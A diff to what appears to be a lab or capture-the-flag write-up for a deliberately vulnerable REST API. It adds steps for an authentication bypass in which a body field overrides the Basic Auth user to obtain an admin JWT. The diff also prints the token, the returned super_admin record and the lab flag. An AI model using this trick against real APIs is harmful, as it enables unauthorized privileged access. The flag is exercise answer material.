@@ -144,13 +144,26 @@ ii)
 The "Vulnerable Users API" Postman collection was used via Bruno.
 i)
 
-- No JWT attacks.
-- The JWT of a POST-request to endpoint `/authenticate` has within the payloas another `access_token` attribute.
-- The JWT of a Basic Auth GET-request to the same endpoint doesn't have this `access_token` payload attribute.
-- The endpoint `/users/user` expect a JWT as token, so the `access_token` within the JWT cannot be used.
-- The `access_token` within the JWT cannot be used as Basic Auth password on the `/authenticate` endpoint.
-
-=> How to exploit?
+- At the `/authenticate` (POST) Endpoint, send the credentials of user `natasha_romanoff` via `Basic Auth`.
+- In the Body, set `username` to `admin`. This returns:
+```
+{
+  "id": "61",
+  "name": "admin",
+  "access_token": "eyJ0eXAiOiJKV1QiLCJnaWQiOiIxNzcxMjU2My0zZGQ1LTRlZTctOWNjNC1hZjczMmI4MTA4OTIiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6ImIyNzlkMTkxLTNjZDEtNDE5MC1iYmEwLTM3ODhmZWRhNTY2NCIsIm4iOiIwTG1rWXBFNGNtaDJGczk1bVlnVlNESGVQaFVkUktBZXBHTlhySHVKNndBZE5HZ1p4VFBpcnBZd29oY2IwQVRYbU1PMHpBV0Zrbkhna3VJdlRJall6N0NMYmZfQWhtbjlGakhnQkRtNmdNVTdwUmlyWDFac0FRSmZXSmJyV2I5NnBHYk12Ry1FUFJicDgzcGlPWk1OenoyOG9WZ0ZlaloyWERxQXlYVlVteVZPMlJ3cC1CLUhIMHlwVVJmeEFtSmQ0MEtwdHRYZHktNk5LajA2OUVSajJ1MWNhZGFSVm9vU2hrM2ZIekRDQWc2Z1gwa3lRN2pWVEpzcjIzYzZueHhSZzNJVVV4NTRtTUhvMU9EdWVDSHo4X3Y1SVZ2ajR2VnMxcVNRWGw3d1VReTVRTEdhWUc1TGJ5US1ZRGxtdmJLc3psVnhqSUEtc0dTZUZpQUtpdEpRUncifSwia2lkIjoiYjI3OWQxOTEtM2NkMS00MTkwLWJiYTAtMzc4OGZlZGE1NjY0In0.ewogICJpZCI6ICI2MSIsCiAgInVzZXJuYW1lIjogImFkbWluIiwKICAiY29tcGFueV9pZCI6ICJnb29nbGUiLAogICJyb2xlIjogInN1cGVyX2FkbWluIiwKICAiYWRkcmVzcyI6ICJCb2NodW0iCn0.GyqHNynZzJ7B6nh9tPMKEwQQG69tY3iFVNwTDJ1ot74AaOGDhPuLtLgf_EJB70khIqnUuvGlfVswr9LacvEayRDVGaPF9GYNvPMWDjIwxPXGlnxX7TGJA0yRqqvhUgM97i6fTGnZKUfkcrmutuYPfEdxQpAH9cf-iFydZmAlh8ASQpJN6sxjaYRqqskqeI-kpyO4seLhC8QyQmTRusVvDfARGgV7HzRg-iE8ajx2jxEp1uSImGvqRGkqM4C-do338ZtL6Q39dc1oxVoJaYIsfr1OyRE45sgaEHsEvVinrvae8Z_aTUZotx3cv5qDLKZPyjVuY7rHv6RQo2eSKLrVow"
+}
+```
+- Using the JWT as Bearer Token at the `users/user` Endpoint, the following gets returned, which includes the Flag:
+```
+{
+  "role": "super_admin",
+  "address": "Bochum",
+  "flag": "FLAG{rest_auth2_hvkUdoRZI1Ow0riC}",
+  "company_id": "google",
+  "id": "61",
+  "username": "admin"
+}
+```
 
 ii)
 
